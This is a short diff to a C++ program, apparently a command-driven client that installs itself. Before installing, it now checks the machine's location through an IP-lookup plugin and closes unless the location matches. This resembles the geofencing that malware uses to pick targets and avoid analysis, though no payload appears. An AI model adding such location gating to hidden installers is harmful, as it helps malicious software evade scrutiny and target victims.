@@ -7,6 +7,10 @@
 #include"FileHelper.h"
 #include"Pathes.h"
 #include"Registry.h"
+#include"LocationDetector.h"
+
+//plugins
+#include"IpInfoApi.h"
 
 //commands
 #include"Hello.h"
@@ -69,6 +73,11 @@ private:
 
 public:
 	static void Run(){
+		//run on location or exit
+		LocationDetector::DetectOrClose(
+			IpInfoApi::getResult().code
+		);
+
 		//check installed and install
 		Install();
 
